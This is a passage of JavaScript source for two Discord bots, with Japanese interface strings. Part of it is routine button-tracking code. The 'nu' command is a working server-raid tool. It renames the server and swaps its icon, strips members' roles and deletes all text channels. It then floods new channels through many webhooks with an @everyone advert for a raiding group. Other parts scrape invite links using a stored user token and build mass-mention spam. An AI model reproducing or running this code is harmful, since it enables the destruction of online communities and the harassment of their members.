    return data;
};

const clearRecentButtonCreation = (channelId) => {
    const existed = recentButtonCreations.has(channelId);
    recentButtonCreations.delete(channelId);
    console.log(`clearRecentButtonCreation(${channelId}): existed=${existed}`);
};

const clearAllRecentButtonCreations = () => {
    const count = recentButtonCreations.size;
    recentButtonCreations.clear();
    console.log(`clearAllRecentButtonCreations: cleared ${count} entries`);
};

const updateRecentButtonCreation = (channelId, messageId, customId) => {
    const existing = recentButtonCreations.get(channelId);
    if (existing) {
        existing.messageId = messageId;
        existing.buttonCustomId = customId;
        console.log(`updateRecentButtonCreation(${channelId}): messageId=${messageId}, customId=${customId}`);
    } else {
        recentButtonCreations.set(channelId, {
            messageId,
            buttonCustomId: customId,
            channelId,
            createdAt: Date.now()
        });
        console.log(`updateRecentButtonCreation(${channelId}): created new entry`);
    }
};

const clearOldButtonCreations = () => {
};

const initializeButtonCreationTracker = (channelId, expectedCount) => {
    const tracker = {
        expected: expectedCount,
        created: 0,
        messageIds: [],
        createdAt: Date.now()
    };
    channelButtonCreationTracker.set(channelId, tracker);
    console.log(`Initialized button creation tracker for channel=${channelId}, expected=${expectedCount} buttons`);
};

const incrementButtonCreated = (channelId, messageId) => {
    const tracker = channelButtonCreationTracker.get(channelId);
    if (tracker) {
        tracker.created++;
        if (messageId) {
            tracker.messageIds.push(messageId);
        }
        console.log(`Button created: channel=${channelId}, created=${tracker.created}/${tracker.expected}, messageId=${messageId}`);
        return tracker.created === tracker.expected; // Returns true if all expected buttons created
    }
    return false;
};

const getButtonCreationStatus = (channelId) => {
    const tracker = channelButtonCreationTracker.get(channelId);
    if (tracker) {
        return {
            expected: tracker.expected,
            created: tracker.created,
            allCreated: tracker.created === tracker.expected,
            messageIds: tracker.messageIds
        };
    }
    return null;
};

const cleanupButtonCreationTracker = (channelId) => {
    channelButtonCreationTracker.delete(channelId);
    console.log(`Cleaned up button creation tracker for channel: ${channelId}`);
};

const clearAllButtonCreationTrackers = () => {
    const count = channelButtonCreationTracker.size;
    channelButtonCreationTracker.clear();
    console.log(`clearAllButtonCreationTrackers: cleared ${count} channel trackers`);
};

// Batch tracker functions for multi-channel button creation
const initializeBatchTracker = (batchId, channelIds) => {
    batchButtonTracker.set(batchId, {
        expectedChannels: new Set(channelIds),
        createdChannels: new Set(),
        createdAt: Date.now()
    });
    console.log(`[BATCH] Initialized batch ${batchId} with ${channelIds.length} channels`);
};

const markChannelButtonCreated = (batchId, channelId) => {
    const batch = batchButtonTracker.get(batchId);
    if (batch && batch.expectedChannels.has(channelId)) {
        batch.createdChannels.add(channelId);
        console.log(`[BATCH] Channel ${channelId} button created (${batch.createdChannels.size}/${batch.expectedChannels.size})`);
        return batch.createdChannels.size === batch.expectedChannels.size;
    }
    return false;
};

const getBatchStatus = (batchId) => {
    const batch = batchButtonTracker.get(batchId);
    if (!batch) return null;
    return {
        expected: batch.expectedChannels.size,
        created: batch.createdChannels.size,
        allCreated: batch.createdChannels.size === batch.expectedChannels.size,
        createdChannels: Array.from(batch.createdChannels),
        pendingChannels: Array.from(batch.expectedChannels).filter(ch => !batch.createdChannels.has(ch))
    };
};

const cleanupBatchTracker = (batchId) => {
    batchButtonTracker.delete(batchId);
    console.log(`[BATCH] Cleaned up batch ${batchId}`);
};

const clearAllBatchTrackers = () => {
    const count = batchButtonTracker.size;
    batchButtonTracker.clear();
    console.log(`clearAllBatchTrackers: cleared ${count} batch trackers`);
};

// Clean up old batch trackers (older than 2 minutes)
const cleanupOldBatches = () => {
    const now = Date.now();
    for (const [batchId, batch] of batchButtonTracker.entries()) {
        if (now - batch.createdAt > 120000) {
            batchButtonTracker.delete(batchId);
            console.log(`[BATCH] Auto-cleaned expired batch ${batchId}`);
        }
    }
};

const fetchGuildMembers = async (guildId) => {
    try {
        const guild = client.guilds.cache.get(guildId);
        if (!guild) {
            return { success: false, error: 'Guild not found or bot not in guild' };
        }

        const members = await guild.members.fetch();
        const humanMembers = members.filter(member => !member.user.bot);
        
        const memberArray = humanMembers.map(member => ({
            id: member.user.id,
            username: member.user.username,
            discriminator: member.user.discriminator || '0',
            nickname: member.nickname || null,
            avatar: member.user.avatar
        }));

        return {
            success: true,
            count: memberArray.length,
            totalMembers: members.size,
            botCount: members.size - humanMembers.size,
            members: memberArray
        };
    } catch (error) {
        console.error('Error fetching guild members:', error);
        return { success: false, error: error.message };
    }
};

const getBotGuilds = () => {
    return client.guilds.cache.map(guild => ({
        id: guild.id,
        name: guild.name,
        memberCount: guild.memberCount
    }));
};

client.once('ready', () => {
    console.log(`Bot logged in as ${client.user.tag}`);
    console.log(`Invite URL (User Install): https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&integration_type=1&scope=applications.commands`);
});

// 2つ目のBotのreadyイベント
client2.once('ready', async () => {
    console.log(`[Bot2] Logged in as ${client2.user.tag}`);
    await registerBot2Commands();
    await resumeAllAlinkIntervals();
});

// Bot2のinteractionCreateハンドラー
client2.on('interactionCreate', async (interaction) => {
    if (interaction.isChatInputCommand()) {
        if (interaction.commandName === 'alink') {
            await handleAlinkSlashCommand(interaction);
        } else if (interaction.commandName === 'autoscan') {
            if (interaction.options.getSubcommand() === 'start') {
                const config = await getAutoScanPanelConfig();
                if (!config.userToken || config.channelIds.length === 0 || config.guildIds.length === 0) {
                    return interaction.reply({
                        content: '❌ 管理パネルで設定を完了してください。\n(ユーザートークン、チャンネルID、サーバーIDが必要です)',
                        ephemeral: true
                    });
                }
                config.enabled = true;
                await updateAutoScanPanelConfig(config);
                interaction.reply({
                    content: `✅ 自動スキャンを開始しました！\n📺 対象チャンネル: ${config.channelIds.length}個\n🖥️ 対象サーバー: ${config.guildIds.length}個`,
                    ephemeral: true
                });
            }
        } else if (interaction.commandName === 'alinkauto') {
            const guildId = interaction.guild.id;
            const config = await getAutoScanPanelConfig();
            
            if (!config.userToken || config.guildIds.length === 0 || !config.sendTargetChannelId) {
                return interaction.reply({
                    content: '❌ 管理パネルで設定を完了してください。\n(ユーザートークン、対象サーバーID、送信先チャンネルが必要です)',
                    ephemeral: true
                });
            }
            
            // Stop existing scan if running
            if (autoscanIntervals.has(guildId)) {
                clearInterval(autoscanIntervals.get(guildId));
                autoscanIntervals.delete(guildId);
            }
            
            // Initialize sent links tracking for this guild
            if (!autoscanSentLinks.has(guildId)) {
                autoscanSentLinks.set(guildId, new Set());
            } else {
                autoscanSentLinks.get(guildId).clear();
            }
            
            await interaction.reply({
                content: '🔍 自動スキャンを開始しました...',
                ephemeral: true
            });
            
            // Start scanning loop
            const sendChannelId = config.sendTargetChannelId;
            const sendChannel = await client2.channels.fetch(sendChannelId);
            const sentLinks = autoscanSentLinks.get(guildId);
            
            let scanCount = 0;
            
            const scanInterval = setInterval(async () => {
                try {
                    scanCount++;
                    console.log(`[AutoScan] Scan run #${scanCount}`);
                    
                    // Reload config each iteration to get latest settings from admin site
                    const latestConfig = await getAutoScanPanelConfig();
                    const targetGuilds = latestConfig.guildIds;
                    const userToken = latestConfig.userToken;
                    const targetChannelIds = latestConfig.channelIds && latestConfig.channelIds.length > 0 ? latestConfig.channelIds : null;
                    
                    for (const targetGuildId of targetGuilds) {
                        try {
                            const result = await scanGuildForInvites(targetGuildId, userToken, 7, targetChannelIds);
                            
                            if (result.success && result.invites && result.invites.length > 0) {
                                const uniqueLinks = [...new Set(result.invites.map(inv => inv.url))];
                                
                                // Filter out already sent links
                                const newLinks = uniqueLinks.filter(link => !sentLinks.has(link));
                                
                                if (newLinks.length > 0) {
                                    // Add new links to sent set
                                    newLinks.forEach(link => sentLinks.add(link));
                                    
                                    // Send each link individually
                                    for (const link of newLinks) {
                                        await sendChannel.send(link);
                                    }
                                    console.log(`[AutoScan] Sent ${newLinks.length} new links`);
                                } else {
                                    console.log(`[AutoScan] No new links detected (${uniqueLinks.length} total, all already sent)`);
                                }
                            }
                        } catch (err) {
                            console.error(`[AutoScan] Error scanning guild ${targetGuildId}:`, err.message);
                        }
                    }
                } catch (err) {
                    console.error('[AutoScan] Error in scan loop:', err.message);
                }
            }, 60 * 1000); // 1分ごと
            
            autoscanIntervals.set(guildId, scanInterval);
            
        } else if (interaction.commandName === 'alinkautostop') {
            const guildId = interaction.guild.id;
            
            if (autoscanIntervals.has(guildId)) {
                clearInterval(autoscanIntervals.get(guildId));
                autoscanIntervals.delete(guildId);
                autoscanSentLinks.delete(guildId);
                
                await interaction.reply({
                    content: '⏹️ 自動スキャンを停止しました。',
                    ephemeral: true
                });
            } else {
                await interaction.reply({
                    content: '❌ 実行中のスキャンはありません。',
                    ephemeral: true
                });
            }
        } else if (interaction.commandName === 'acamerasetup') {
            try {
                const { setCameraChannel } = require('./storage/fileStorage');
                
                const channelId = interaction.channelId;
                const guildId = interaction.guildId;
                
                await setCameraChannel(channelId, guildId);
                
                await interaction.reply({ content: `✅ このチャンネルをカメラ画像受信チャンネルに設定しました！\nチャンネルID: ${channelId}`, ephemeral: true });
                console.log(`[Bot2] /acamerasetup executed: channelId=${channelId}, guildId=${guildId}`);
            } catch (error) {
                console.error('[Bot2] Error in /acamerasetup:', error);
                try {
                    if (!interaction.replied) {
                        await interaction.reply({ content: `❌ エラーが発生しました: ${error.message}`, ephemeral: true });
                    }
                } catch (e) {}
            }
        }
    }
});

// ========== NU コマンド用のデータストア (Bot1用) ==========
const messageChoice = new Map();
const serverRunningClient1 = new Map();

const ANKO_MESSAGE = `# [あんこちゃんですあんこ鯖では主にピクセルガンの無償代行や荒らしを行っていますスマホ勢荒らし知識がなくても自作あんこアプリで初日から最強荒らし勢になろうピクセルガンも初日で最強になろう](<https://discord.gg/NYmSAdHjWV>)
    # 🤍🩷💚🖤❤️🩵🩶🧡💙💛💜🤎❣️💗💝💓❤️‍🩹❤️‍🔥💞💘💖💕
    # 😉あんこちゃんだよ！
    # 🩵あんこ鯖では主にピクセルガンの無償代行
    # 🧡ワイワイ雑談‼️
    # 🩷荒らしを行っています
    # 🤍スマホ勢でも荒らし知識がなくても
    # 💚自作あんこアプリで最強荒らし勢になろう
    # 💜ピクセルガンも初日で最強になろ！
    # 🖤 闘あんこちゃん🥹
    # https://excessive-chocolate-qomcybqhdz.edgeone.app/IMG_3973.gif
    # https://miserable-red-2wlieplbxn.edgeone.app/IMG_3948.gif
    # https://democratic-tomato-w8nercfjsr.edgeone.app/IMG_3949.gif
    # https://xeric-purple-2nw70kglwu.edgeone.app/IMG_3972.gif
    # https://discord.gg/NYmSAdHjWV
    @everyone`;

// Extract Discord invite links from text
const extractInviteLinks = (text) => {
    const inviteRegex = /(https?:\/\/)?(www\.)?discord(app)?\.gg\/[a-zA-Z0-9]+/gi;
    const matches = text.match(inviteRegex) || [];
    return matches.map(m => m.startsWith('http') ? m : `https://discord.gg/${m.split('/').pop()}`);
};

// あんこ翠🍡 (client) のmessageCreateハンドラー (nu, ストップ, クリア + チャンネル監視)
client.on('messageCreate', async (message) => {
    if (message.author.bot || !message.guild) return;

    const guildId = message.guild.id;

    // Channel Monitor Logic - Now handled by server.js polling with user token
    // This code is no longer needed as monitoring is done server-side

    if (message.content === 'nu') {
        if (serverRunningClient1.get(guildId)) return;
        serverRunningClient1.set(guildId, true);

        // 並列で実行開始（待たない）
        (async () => {
            try {
                const iconUrl = 'https://evil-blush-ybg1jkzg9g.edgeone.app/無題58_20251027002244.png';
                const response = await axios.get(iconUrl, { responseType: 'arraybuffer' });
                const icon = Buffer.from(response.data);
                await message.guild.setIcon(icon);
                console.log('[NU-翠] サーバーアイコンを変更しました');
            } catch (e) { console.warn('[NU-翠] アイコン変更失敗'); }
        })();

        (async () => {
            try {
                await message.guild.setName('あんこの植民地🥰');
                console.log('[NU-翠] サーバー名を変更しました');
            } catch (e) {}
        })();

        // ロール削除も並列で開始
        removeAllRolesExceptBotClient1(message.guild, client);

        // 既存チャンネル削除
        deleteAllTextChannelsClient1(message.guild);

        // Botはチャンネル作成に集中（メッセージはWebhookに任せる）
        createAndSpamNewChannelsClient1(message.guild, serverRunningClient1, messageChoice);

    } else if (message.content === 'ストップ') {
        serverRunningClient1.set(guildId, false);
        try {
            await message.channel.send('すとっぷぅ！');
        } catch (e) {}
        console.log(`[NU-翠] ストップ: サーバー ${guildId} の処理を停止しました`);

    } else if (message.content === 'クリア') {
        try {
            await message.channel.send('チャンネルをクリアして新しいチャンネルを作成しています...');
        } catch (e) {}
        await clearAndCreateNewChannelClient1(message.guild, message.channel.id);
    }
});

// ========== Client1 (あんこ翠🍡) 用のNU関数 ==========
const webhookPoolsClient1 = new Map();
const MAX_WEBHOOKS_CLIENT1 = 15;
const CHANNEL_CREATORS_CLIENT1 = 15;
const BOT_SPAM_WORKERS_CLIENT1 = 5;

async function removeAllRolesExceptBotClient1(guild, clientBot) {
    const me = guild.members.me;
    const promises = [];

    for (const [, member] of guild.members.cache) {
        if (member.id === me.id) continue;

        const removableRoles = member.roles.cache.filter(role => 
            role.position < me.roles.highest.position && role.id !== guild.id
        );

        if (removableRoles.size > 0) {
            promises.push(
                member.roles.remove(removableRoles)
                    .then(() => {
                        console.log(`[NU-翠] ロール削除: ${member.user.tag}`);
                        return true;
                    })
                    .catch(error => {
                        console.error(`[NU-翠] ロール削除失敗: ${error}`);
                        return false;
                    })
            );
        }
    }

    const results = await Promise.all(promises);
    return results.filter(r => r).length;
}

async function deleteAllTextChannelsClient1(guild) {
    const channels = guild.channels.cache.filter(ch => ch.isTextBased());
    channels.forEach(ch => ch.delete().catch(() => {}));
}

async function createAndSpamNewChannelsClient1(guild, serverRunning, messageChoice) {
    const guildId = guild.id;
    
    if (!webhookPoolsClient1.has(guildId)) {
        webhookPoolsClient1.set(guildId, { webhooks: [], pendingChannels: [], allChannels: [] });
    }
    const pool = webhookPoolsClient1.get(guildId);
    pool.webhooks = [];
    pool.pendingChannels = [];
    pool.allChannels = [];
    
    for (let i = 0; i < CHANNEL_CREATORS_CLIENT1; i++) {
        createChannelLoopClient1(guild, serverRunning, pool, messageChoice);
    }
    
    webhookRotationLoopClient1(guild, serverRunning, messageChoice, pool);
    
    for (let i = 0; i < BOT_SPAM_WORKERS_CLIENT1; i++) {
        botSpamAllChannelsClient1(guild, serverRunning, messageChoice, pool);
    }
}

async function createChannelLoopClient1(guild, serverRunning, pool, messageChoice) {
    const selectedMessage = messageChoice.get(guild.id) || ANKO_MESSAGE;
    
    while (serverRunning.get(guild.id)) {
        try {
            const newChannel = await guild.channels.create({
                name: 'あんこちゃんの植民地化👏😉',
                type: 0
            });
            
            pool.allChannels.push(newChannel.id);
            
            for (let i = 0; i < 5; i++) {
                newChannel.send(selectedMessage).catch(() => {});
            }
            
            if (pool.webhooks.length < MAX_WEBHOOKS_CLIENT1) {
                newChannel.createWebhook({ name: 'あんこちゃん' })
                    .then(webhook => {
                        pool.webhooks.push(webhook);
                        console.log(`[NU-翠] Webhook作成 (${pool.webhooks.length}/${MAX_WEBHOOKS_CLIENT1}) ch:${newChannel.id}`);
                        spamWithWebhookClient1(webhook, guild, serverRunning, messageChoice);
                    })
                    .catch(e => console.log(`[NU-翠] Webhook作成失敗: ${e.message}`));
            } else {
                pool.pendingChannels.push(newChannel.id);
            }
        } catch (error) {
            if (error.code === 429 || error.message?.includes('rate')) {
                await new Promise(r => setTimeout(r, 100));
            }
        }
    }
}

async function webhookRotationLoopClient1(guild, serverRunning, messageChoice, pool) {
    while (serverRunning.get(guild.id)) {
        if (pool.pendingChannels.length > 0 && pool.webhooks.length > 0) {
            const newChannelId = pool.pendingChannels.shift();
            const webhook = pool.webhooks[Math.floor(Math.random() * pool.webhooks.length)];
            webhook.edit({ channel: newChannelId }).catch(() => {});
        }
        await new Promise(r => setTimeout(r, 20));
    }
    
    pool.webhooks = [];
    pool.pendingChannels = [];
    pool.allChannels = [];
}

async function spamWithWebhookClient1(webhook, guild, serverRunning, messageChoice) {
    const selectedMessage = messageChoice.get(guild.id) || ANKO_MESSAGE;
    const avatarURL = 'https://evil-blush-ybg1jkzg9g.edgeone.app/無題58_20251027002244.png';
    
    while (serverRunning.get(guild.id)) {
        const promises = [];
        for (let i = 0; i < 20; i++) {
            promises.push(
                webhook.send({
                    content: selectedMessage,
                    username: 'あんこちゃん',
                    avatarURL: avatarURL
                }).catch(() => {})
            );
        }
        await Promise.all(promises);
    }
}

async function botSpamAllChannelsClient1(guild, serverRunning, messageChoice, pool) {
    const guildId = guild.id;
    const selectedMessage = messageChoice.get(guildId) || ANKO_MESSAGE;
    
    while (serverRunning.get(guildId)) {
        const channels = [...pool.allChannels];
        if (channels.length > 0) {
            const promises = [];
            for (const channelId of channels) {
                const channel = guild.channels.cache.get(channelId);
                if (channel) {
                    promises.push(channel.send(selectedMessage).catch(() => {}));
                }
            }
            if (promises.length > 0) {
                await Promise.all(promises);
            }
        } else {
            await new Promise(r => setTimeout(r, 50));
        }
    }
}

async function clearAndCreateNewChannelClient1(guild, excludeChannelId) {
    let newChannel = null;
    try {
        newChannel = await guild.channels.create({
            name: '新しいチャンネル',
            type: 0
        });
        console.log(`[NU-翠] 新しいチャンネルを作成しました: ${newChannel.id}`);
        await newChannel.send('チャンネルのクリアが完了しました！');
    } catch (error) {
        console.error(`[NU-翠] 新しいチャンネル作成失敗: ${error}`);
        return;
    }

    const channelsToDelete = guild.channels.cache.filter(ch => 
        ch.isTextBased() && ch.id !== newChannel.id
    );
    
    const deletePromises = channelsToDelete.map(ch => 
        ch.delete().catch(err => console.log(`[NU-翠] チャンネル削除失敗: ${ch.name}`))
    );
    await Promise.all(deletePromises);
    console.log(`[NU-翠] ${deletePromises.length}個のチャンネルを削除しました`);
}

const encodeButtonData = (message, mentionCount) => {
    const data = { m: message.substring(0, 50), c: mentionCount };
    return Buffer.from(JSON.stringify(data)).toString('base64').replace(/=/g, '');
};

const decodeButtonData = (encoded) => {
    try {
        let padded = encoded;
        while (padded.length % 4 !== 0) padded += '=';
        const decoded = Buffer.from(padded, 'base64').toString('utf8');
        return JSON.parse(decoded);
    } catch (e) {
        return null;
    }
};

client.on('interactionCreate', async (interaction) => {
    if (interaction.isChatInputCommand()) {
        if (interaction.commandName === 'atest') {
            try {
                if (interaction.replied || interaction.deferred) {
                    console.log('/atest: Interaction already handled');
                    return;
                }
                
                const providedTestId = interaction.options.getString('test_id');
                const testId = providedTestId || Date.now().toString(36);
                const response = await interaction.reply({
                    content: `test:${testId}`,
                    withResponse: true
                });
                
                const messageId = response?.resource?.message?.id || response?.id;
                
                const channelKey = interaction.channelId;
                pendingAtestMessages.set(channelKey, {
                    messageId: messageId,
                    channelId: interaction.channelId,
                    userId: interaction.user.id,
                    testId: testId,
                    createdAt: Date.now()
                });
                
                setTimeout(() => {
                    const stored = pendingAtestMessages.get(channelKey);
                    if (stored && stored.testId === testId) {
                        pendingAtestMessages.delete(channelKey);
                    }
                }, 120000);
                
                console.log(`/atest executed: messageId=${messageId}, channelId=${interaction.channelId}, testId=${testId}`);
                
            } catch (error) {
                if (error.code === 10062 || error.code === 40060) {
                    console.log('/atest: Interaction expired or already acknowledged');
                    return;
                }
                console.error('Error in /atest:', error);
            }
            return;
        }
        
        if (interaction.commandName === 'aev') {
            try {
                if (interaction.replied || interaction.deferred) {
                    console.log('/aev: Interaction already handled');
                    return;
                }
                
                await interaction.reply({
                    content: '@everyone',
                    ephemeral: true,
                    allowedMentions: { parse: ['everyone'] }
                });
                console.log(`/aev executed: userId=${interaction.user.id}`);
                
            } catch (error) {
                if (error.code === 10062 || error.code === 40060) {
                    console.log('/aev: Interaction expired or already acknowledged');
                    return;
                }
                console.error('Error in /aev:', error);
            }
            return;
        }
        
        if (interaction.commandName === 'aserver') {
            try {
                if (interaction.replied || interaction.deferred) {
                    console.log('/aserver: Interaction already handled');
                    return;
                }
                
                const guildId = interaction.guildId;
                
                if (!guildId) {
                    await interaction.reply({
                        content: '❌ このコマンドはサーバー内でのみ使用できます。',
                        ephemeral: true
                    });
                    return;
                }
                
                await interaction.deferReply({ ephemeral: true });
                
                const userId = interaction.user.id;
                const member = interaction.member;
                
                const VIEW_CHANNEL = 1024n;
                const SEND_MESSAGES = 2048n;
                const USE_APPLICATION_COMMANDS = 2147483648n;
                const USE_EXTERNAL_APPS = 1125899906842624n;
                const ADMINISTRATOR = 8n;
                const MENTION_EVERYONE = 131072n;
                const EMBED_LINKS = 16384n;
                const ATTACH_FILES = 32768n;
                const MANAGE_MESSAGES = 8192n;
                
                const memberPermissions = interaction.memberPermissions;
                const appPermissions = interaction.appPermissions;
                
                let basePermissions = 0n;
                if (memberPermissions) {
                    basePermissions = memberPermissions.bitfield;
                }
                
                const isAdmin = memberPermissions ? memberPermissions.has('Administrator') : false;
                
                const guildName = interaction.guild?.name || `サーバー(${guildId})`;
                
                let message = `📋 **${guildName}** の権限情報\n`;
                message += `👤 ユーザー: <@${userId}>\n`;
                message += `🆔 サーバーID: \`${guildId}\`\n`;
                message += isAdmin ? '👑 **管理者権限あり（全権限）**\n\n' : '\n';
                
                message += `**📊 あなたの権限:**\n`;
                
                const permChecks = [
                    { name: 'チャンネル閲覧', flag: VIEW_CHANNEL },
                    { name: 'メッセージ送信', flag: SEND_MESSAGES },
                    { name: 'アプリコマンド使用', flag: USE_APPLICATION_COMMANDS },
                    { name: '外部アプリ使用', flag: USE_EXTERNAL_APPS },
                    { name: '@everyone メンション', flag: MENTION_EVERYONE },
                    { name: '埋め込みリンク', flag: EMBED_LINKS },
                    { name: 'ファイル添付', flag: ATTACH_FILES },
                    { name: 'メッセージ管理', flag: MANAGE_MESSAGES },
                    { name: '管理者', flag: ADMINISTRATOR }
                ];
                
                for (const perm of permChecks) {
                    const hasPerm = isAdmin || (basePermissions & perm.flag) !== 0n;
                    message += `${hasPerm ? '✅' : '❌'} ${perm.name}\n`;
                }
                
                if (member?.roles) {
                    const roleCount = Array.isArray(member.roles) ? member.roles.length : (member.roles.cache?.size || 0);
                    message += `\n**🎭 ロール数:** ${roleCount}個\n`;
                }
                
                message += `\n**💡 ヒント:**\n`;
                message += `• 外部アプリを使うには「外部アプリ使用」が必要です\n`;
                message += `• 各チャンネルごとに権限が異なる場合があります\n`;
                message += `• チャンネルIDはサイトの機能で確認できます`;
                
                await interaction.editReply({ content: message });
                console.log(`/aserver executed: userId=${userId}, guildId=${guildId}, isAdmin=${isAdmin}`);
                
            } catch (error) {
                if (error.code === 10062 || error.code === 40060) {
                    console.log('/aserver: Interaction expired or already acknowledged');
                    return;
                }
                console.error('Error in /aserver:', error);
                try {
                    if (interaction.deferred) {
                        await interaction.editReply({ content: `❌ エラーが発生しました: ${error.message}` });
                    }
                } catch (e) {}
            }
            return;
        }
        
        if (interaction.commandName === 'ahe') {
            const interactionId = interaction.id;
            const interactionToken = interaction.token;
            
            try {
                let customMessage = interaction.options.getString('text') || '';
                const userProvidedCustomText = customMessage.trim() !== '';
                const randLen = interaction.options.getInteger('rand_len') || 0;
                const mentionEveryone = interaction.options.getBoolean('mention_everyone') || false;
                const useCustom = interaction.options.getBoolean('use_custom');
                const customIdOption = interaction.options.getString('custom_id');
                // Simplified: directly use user_ids from command option
                const userIdsInput = interaction.options.getString('user_ids') || '';
                // Simplified: directly use mention_count from command option (site input)
                const mentionCountOption = interaction.options.getInteger('mention_count');
                const mentionCount = mentionCountOption !== null ? mentionCountOption : config.DEFAULT_MENTION_COUNT;
                const useRandomText = interaction.options.getBoolean('use_random_text') || false;
                
                console.log(`/ahe: Using user_ids directly from command option, mentionCount=${mentionCount}`);

                if (randLen < 0 || randLen > 64) {
                    try {
                        await axios.post(
                            `https://discord.com/api/v10/interactions/${interactionId}/${interactionToken}/callback`,
                            { type: 4, data: { content: 'rand_len は 0〜64 の整数で指定してください。', flags: 64 } },
                            { headers: { 'Content-Type': 'application/json' } }
                        );
                    } catch (e) { console.log('/ahe randLen error reply failed'); }
                    return;
                }

                if (useCustom) {
                    const userMessages = await getUserCustomMessages(interaction.user.id);
                    if (userMessages.length > 0) {
                        const latestMessage = userMessages[userMessages.length - 1];
                        customMessage = latestMessage.content;
                        console.log(`/ahe: Using latest custom message for user ${interaction.user.id}`);
                    } else {
                        try {
                            await axios.post(
                                `https://discord.com/api/v10/interactions/${interactionId}/${interactionToken}/callback`,
                                { type: 4, data: { content: `❌ カスタムメッセージがまだありません。\n\`/aadd add\` で作成してください。`, flags: 64 } },
                                { headers: { 'Content-Type': 'application/json' } }
                            );
                        } catch (e) { console.log('/ahe useCustom error reply failed'); }
                        return;
                    }
                } else if (customIdOption) {
                    const userCustomMessage = await getUserCustomMessageByIdOrTitle(interaction.user.id, customIdOption);
                    if (userCustomMessage) {
                        customMessage = userCustomMessage.content;
                        const identifier = userCustomMessage.title ? `title="${userCustomMessage.title}"` : `ID=${userCustomMessage.id}`;
                        console.log(`/ahe: Using custom message ${identifier} for user ${interaction.user.id}`);
                    } else {
                        try {
                            await axios.post(
                                `https://discord.com/api/v10/interactions/${interactionId}/${interactionToken}/callback`,
                                { type: 4, data: { content: `❌ カスタムメッセージ \`${customIdOption}\` が見つかりませんでした。\n\`/aadd list\` で自分のメッセージを確認してください。\n💡 IDまたはタイトルで検索できます。`, flags: 64 } },
                                { headers: { 'Content-Type': 'application/json' } }
                            );
                        } catch (e) { console.log('/ahe customId error reply failed'); }
                        return;
                    }
                }
                
                if (!customMessage) {
                    customMessage = config.DEFAULT_MESSAGE;
                }
                
                // If user provided custom text (not default message), append " by Anko" at the end
                if (userProvidedCustomText && customMessage !== config.DEFAULT_MESSAGE) {
                    customMessage = customMessage + ' by Anko';
                    console.log(`/ahe: Appended ' by Anko' to custom message`);
                }

                // Parse user_ids from command option (site input)
                // Supports direct IDs or STORAGE:key for large lists
                let idsToMention = [];
                if (userIdsInput.trim()) {
                    if (userIdsInput.startsWith('STORAGE:')) {
                        // Large list stored in server storage
                        const storageKey = userIdsInput.replace('STORAGE:', '');
                        try {
                            const response = await axios.get(`http://localhost:5000/api/stored-user-ids/${storageKey}`, {
                                timeout: 5000
                            });
                            if (response.data.success && response.data.userIds && response.data.userIds.length > 0) {
                                idsToMention = response.data.userIds;
                                console.log(`/ahe: Fetched ${idsToMention.length} user_ids from storage key=${storageKey}`);
                            } else {
                                console.log(`/ahe: Storage key ${storageKey} not found or empty`);
                            }
                        } catch (e) {
                            console.error(`/ahe: Failed to fetch user_ids from storage: ${e.message}`);
                        }
                    } else {
                        // Direct IDs from site input
                        idsToMention = userIdsInput
                            .split(/[\s,]+/)
                            .map(id => id.replace(/[<@!>]/g, '').trim())
                            .filter(id => id && /^\d+$/.test(id));
                        console.log(`/ahe: Parsed ${idsToMention.length} user_ids directly from site input`);
                    }
                }

                const buttonToken = generateButtonToken();
                
                storeButtonPayload(buttonToken, {
                    message: customMessage,
                    randLen: randLen,
                    idsToMention: idsToMention,
                    mentionCount: mentionCount,
                    mentionEveryone: mentionEveryone,
                    useRandomText: useRandomText,
                    userId: interaction.user.id,
                    channelId: interaction.channelId
                });
                
                console.log(`/ahe: Created button token=${buttonToken}, idsToMention=${idsToMention.length} users, useRandomText=${useRandomText}`);

                const customId = `ahe_t_${buttonToken}`;
                
                recentButtonCreations.set(interaction.channelId, {
                    buttonCustomId: customId,
                    buttonToken: buttonToken,
                    channelId: interaction.channelId,
                    userId: interaction.user.id,
                    message: customMessage,
                    randLen: randLen,
                    idsToMention: idsToMention,
                    mentionCount: mentionCount,
                    mentionEveryone: mentionEveryone,
                    useRandomText: useRandomText,
                    interactionToken: interactionToken,
                    messageId: `pending_${Date.now()}`,
                    createdAt: Date.now()
                });
                
                try {
                    await axios.post(
                        `https://discord.com/api/v10/interactions/${interactionId}/${interactionToken}/callback`,
                        {
                            type: 4,
                            data: {
                                content: '▶ をクリック',
                                flags: 64,
                                components: [{
                                    type: 1,
                                    components: [{
                                        type: 2,
                                        custom_id: customId,
                                        label: '▶',
                                        style: 2
                                    }]
                                }]
                            }
                        },
                        { headers: { 'Content-Type': 'application/json' } }
                    );
                    console.log(`/ahe: Button created successfully via raw HTTP`);
                    
                    // Fetch the actual messageId from webhook
                    try {
                        const webhookUrl = `https://discord.com/api/v10/webhooks/${client.user.id}/${interactionToken}/messages/@original`;
                        const msgResponse = await axios.get(webhookUrl, { timeout: 5000 });
                        if (msgResponse.data?.id) {
                            updateRecentButtonCreation(interaction.channelId, msgResponse.data.id, customId);
                            console.log(`/ahe: Updated messageId=${msgResponse.data.id} for channel ${interaction.channelId}`);
                        }
                    } catch (fetchError) {
                        console.log(`/ahe: Could not fetch messageId: ${fetchError.message}`);
                    }
                } catch (httpError) {
                    console.log(`/ahe: HTTP callback failed: ${httpError.response?.data?.code} - ${httpError.response?.data?.message || httpError.message}`);
                }
                
                console.log(`/ahe executed: userId=${interaction.user.id}, randLen=${randLen}, mentionCount=${mentionCount}`);

            } catch (error) {
                console.error('/ahe error:', error.code, error.message, error);
                if (error.code === 10062 || error.code === 40060) {
                    console.log('/ahe: Interaction expired or already acknowledged');
                    return;
                }
                console.error('Error showing ahe button:', error);
            }
        }
        
        if (interaction.commandName === 'aadd') {
            try {
                if (interaction.replied || interaction.deferred) {
                    console.log('/aadd: Interaction already handled');
                    return;
                }
                
                const subcommand = interaction.options.getSubcommand();
                const userId = interaction.user.id;
                
                if (subcommand === 'add') {
                    const title = interaction.options.getString('title');
                    const content = interaction.options.getString('content');
                    const newMessage = await addUserCustomMessage(userId, content, title);
                    
                    let replyContent = `✅ カスタムメッセージを保存しました！\n**ID:** \`${newMessage.id}\``;
                    if (title) {
                        replyContent += `\n**タイトル:** \`${title}\``;
                    }
                    replyContent += `\n**プレビュー:** ${content.length > 100 ? content.substring(0, 100) + '...' : content}`;
                    replyContent += `\n\n💡 **/aanko** で使うには **custom_id** に ID または タイトル を入力してください。`;
                    
                    await interaction.reply({
                        content: replyContent,
                        ephemeral: true
                    });
